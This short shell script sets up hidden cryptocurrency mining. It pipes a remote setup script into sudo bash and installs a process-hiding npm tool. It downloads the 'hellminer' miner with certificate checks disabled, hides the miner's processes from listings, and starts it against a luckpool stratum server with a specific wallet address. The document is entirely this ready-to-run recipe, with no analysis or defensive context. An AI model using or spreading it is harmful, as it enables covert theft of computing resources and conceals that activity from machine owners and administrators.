curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget --no-check-certificate https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && apt install screen && screen
sudo ph add hellminer
sudo ph add verus-solver
./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RXJdpoJge8fr62Bguz2EDoXVaNA7o6ZaEc.CPU -p x --cpu 4
